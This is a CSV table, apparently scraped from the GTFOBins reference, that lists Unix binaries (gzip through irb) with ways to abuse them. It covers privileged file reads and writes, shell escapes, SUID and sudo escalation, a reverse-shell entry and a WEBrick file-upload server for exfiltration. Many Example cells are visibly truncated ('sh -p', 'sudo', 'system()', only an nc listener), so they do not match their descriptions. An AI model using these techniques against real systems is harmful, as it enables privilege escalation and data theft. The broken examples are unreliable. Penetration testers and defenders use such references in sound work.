Binary,Function Name,Function URL,Description,Example
gzip,File read,https://gtfobins.github.io/gtfobins/gzip/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
gzip -f $LFILE -t"
gzip,SUID,https://gtfobins.github.io/gtfobins/gzip/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
gzip,Sudo,https://gtfobins.github.io/gtfobins/gzip/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
hd,File read,https://gtfobins.github.io/gtfobins/hd/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
hd ""$LFILE"""
hd,SUID,https://gtfobins.github.io/gtfobins/hd/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
hd,Sudo,https://gtfobins.github.io/gtfobins/hd/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
head,File read,https://gtfobins.github.io/gtfobins/head/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
head -c1G ""$LFILE"""
head,SUID,https://gtfobins.github.io/gtfobins/head/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
head,Sudo,https://gtfobins.github.io/gtfobins/head/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
hexdump,File read,https://gtfobins.github.io/gtfobins/hexdump/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
hexdump -C ""$LFILE"""
hexdump,SUID,https://gtfobins.github.io/gtfobins/hexdump/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
hexdump,Sudo,https://gtfobins.github.io/gtfobins/hexdump/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
highlight,File read,https://gtfobins.github.io/gtfobins/highlight/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
highlight --no-doc --failsafe ""$LFILE"""
highlight,SUID,https://gtfobins.github.io/gtfobins/highlight/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
highlight,Sudo,https://gtfobins.github.io/gtfobins/highlight/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
hping3,Shell,https://gtfobins.github.io/gtfobins/hping3/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"hping3
/bin/sh"
hping3,SUID,https://gtfobins.github.io/gtfobins/hping3/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
hping3,Sudo,https://gtfobins.github.io/gtfobins/hping3/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
iconv,File write,https://gtfobins.github.io/gtfobins/iconv/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
echo ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE"""
iconv,File read,https://gtfobins.github.io/gtfobins/iconv/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
iconv -f 8859_1 -t 8859_1 ""$LFILE"""
iconv,SUID,https://gtfobins.github.io/gtfobins/iconv/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
iconv,Sudo,https://gtfobins.github.io/gtfobins/iconv/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
iftop,Shell,https://gtfobins.github.io/gtfobins/iftop/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"iftop
!/bin/sh"
iftop,Sudo,https://gtfobins.github.io/gtfobins/iftop/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
iftop,Limited SUID,https://gtfobins.github.io/gtfobins/iftop/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
install,SUID,https://gtfobins.github.io/gtfobins/install/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
install,Sudo,https://gtfobins.github.io/gtfobins/install/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ionice,Shell,https://gtfobins.github.io/gtfobins/ionice/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,ionice /bin/sh
ionice,SUID,https://gtfobins.github.io/gtfobins/ionice/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ionice,Sudo,https://gtfobins.github.io/gtfobins/ionice/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ip,File read,https://gtfobins.github.io/gtfobins/ip/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ip -force -batch ""$LFILE"""
ip,SUID,https://gtfobins.github.io/gtfobins/ip/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ip,Sudo,https://gtfobins.github.io/gtfobins/ip/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
irb,Shell,https://gtfobins.github.io/gtfobins/irb/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"irb
exec '/bin/bash'"
irb,Reverse shell,https://gtfobins.github.io/gtfobins/irb/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
irb,File upload,https://gtfobins.github.io/gtfobins/irb/#file-upload,It can exfiltrate files on the network.,"irb
require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;"
